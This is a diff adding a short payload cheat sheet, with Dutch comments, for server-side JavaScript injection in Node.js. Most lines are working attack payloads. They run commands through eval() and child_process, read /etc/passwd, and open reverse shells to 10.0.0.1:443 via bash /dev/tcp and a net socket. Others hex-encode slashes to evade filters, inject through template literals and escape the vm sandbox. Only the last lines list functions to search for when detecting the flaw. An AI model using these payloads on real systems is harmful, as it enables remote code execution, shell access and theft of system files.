@@ -1,0 +1,26 @@
+# Node.js Server-Side JavaScript Injection
+# === eval() injection ===
+# Als user input in eval() terechtkomt:
+1+1
+require('child_process').execSync('id').toString()
+require('child_process').execSync('cat /etc/passwd').toString()
+# === Reverse shell via eval() ===
+require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.0.0.1/443 0>&1"')
+# Of met net module:
+var net=require('net'),sh=require('child_process').exec('/bin/bash');var c=new net.Socket();c.connect(443,'10.0.0.1',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});
+# === Slash bypass (hex encoding) ===
+# Als / geblokkeerd: gebruik \x2f
+var cmd = '\x2fbin\x2fbash';
+require('child_process').exec(cmd + ' -c "bash -i >& \x2fdev\x2ftcp\x2f10.0.0.1\x2f443 0>&1"')
+# === Template literal injection ===
+${require('child_process').execSync('id')}
+# === vm module sandbox escape ===
+this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
+# === File lezen ===
+require('fs').readFileSync('/etc/passwd','utf8')
+# === Detectie ===
+# Zoek naar: eval(), Function(), vm.runInNewContext()
+# setTimeout(user_input), setInterval(user_input)
+# Bassmaster batch $ref syntax, Express route parameters
+# Tip: Node.js eval is direct RCE - geen sandbox
+# Tip: JSON.parse is VEILIG, eval() op JSON is NIET veilig
